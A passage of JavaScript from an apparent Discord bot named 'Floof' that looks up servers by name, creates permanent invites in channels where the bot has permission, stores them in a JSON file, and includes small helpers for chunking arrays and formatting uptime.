        guild = guilds.find(g => g.name.toLowerCase().includes(query.toLowerCase()));
        return guild;
    },

    async createInviteForGuild(guild) {
        // Find a suitable channel to create invite from
        const channel = guild.channels.cache.find(ch => 
            ch.type === 0 && // Text channel
            ch.permissionsFor(guild.members.me)?.has([PermissionFlagsBits.CreateInstantInvite])
        );

        if (!channel) {
            console.log(`No suitable channel found in ${guild.name} to create invite`);
            return null;
        }

        try {
            const invite = await channel.createInvite({
                maxAge: 0, // Never expires
                maxUses: 0, // Unlimited uses
                unique: false,
                reason: 'Floof bot invite tracking'
            });

            return {
                url: invite.url,
                code: invite.code,
                channelId: channel.id,
                createdAt: new Date().toISOString(),
                expiresAt: null
            };
        } catch (error) {
            console.error(`Failed to create invite for ${guild.name}:`, error);
            return null;
        }
    },

    async getStoredInvites() {
        try {
            const data = await fs.readFile(INVITES_FILE, 'utf8');
            return JSON.parse(data);
        } catch (error) {
            return {};
        }
    },

    async storeInvite(guildId, inviteData) {
        const invites = await this.getStoredInvites();
        invites[guildId] = inviteData;
        await this.saveInvites(invites);
    },

    async saveInvites(invites) {
        try {
            // Ensure data directory exists
            const dataDir = path.dirname(INVITES_FILE);
            try {
                await fs.access(dataDir);
            } catch {
                await fs.mkdir(dataDir, { recursive: true });
            }

            await fs.writeFile(INVITES_FILE, JSON.stringify(invites, null, 2));
        } catch (error) {
            console.error('Error saving invites:', error);
        }
    },

    chunkArray(array, size) {
        const chunks = [];
        for (let i = 0; i < array.length; i += size) {
            chunks.push(array.slice(i, i + size));
        }
        return chunks;
    },

    formatUptime(uptime) {
        const seconds = Math.floor(uptime / 1000);
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        
        if (days > 0) return `${days}d ${hours}h ${minutes}m`;
        if (hours > 0) return `${hours}h ${minutes}m`;
        return `${minutes}m`;
    }
};
